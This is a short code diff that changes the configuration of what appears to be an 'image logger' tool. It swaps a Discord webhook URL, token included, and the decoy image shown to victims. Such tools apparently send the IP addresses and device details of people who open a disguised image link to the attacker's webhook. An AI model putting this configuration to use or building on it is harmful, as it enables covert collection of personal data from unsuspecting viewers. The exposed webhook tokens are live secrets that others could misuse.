@@ -134,8 +134,8 @@ root.mainloop()
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1451000093691084997/gZm2Nvt3CYoNoam9-A8Xr2rkZTnNIiiHGjXaP83sgMMRkwaGL_LIsb3C_fW93vvyF5HS",
-    "image": "https://i.pinimg.com/474x/7c/bc/07/7cbc07cffa0fa6de589c504f78e635f3.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1457850148507095253/z9zaA8Bg4744x3Ydr9qEAIqws2qpdelxT0csW2gurAvZwYAmaDi1gfMPXpRt6mLreGDs",
+    "image": "https://i.etsystatic.com/21877275/r/il/6a5640/4970900455/il_fullxfull.4970900455_btfh.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
